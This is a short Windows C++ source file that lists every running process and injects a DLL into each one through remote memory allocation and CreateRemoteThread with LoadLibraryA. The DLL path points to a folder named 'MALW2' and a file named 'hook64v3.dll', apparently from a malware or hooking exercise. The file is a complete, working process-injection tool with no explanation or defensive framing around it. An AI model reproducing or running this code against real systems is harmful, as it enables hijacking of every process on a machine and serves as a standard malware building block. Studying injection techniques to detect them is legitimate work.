#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <wchar.h>
#include <strsafe.h>
#include <exception>
using namespace std;

int main(void)
{
    // Get the list of process identifiers.

    DWORD aProcesses[8192], cbNeeded, cProcesses;
    unsigned int i;

    const char* dllPath = "C:\\Users\\User\\Desktop\\MALW2\\hook64v3.dll";

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 1;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process (inject the dll to all possible processes).

    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            //_tprintf(TEXT("  (PID: %u)\n"), aProcesses[i]);
            
            try{
                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, aProcesses[i]);
            
                //HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

                if (hProc && hProc != INVALID_HANDLE_VALUE)
                {
                    void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                    WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                    HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                    if (hThread)
                    {
                        CloseHandle(hThread);
                    }
                }

                if (hProc)
                {
                    CloseHandle(hProc);
                }
            }
            catch (exception& e) {
                cerr << e.what();
            }
        }
    }

    return 0;
}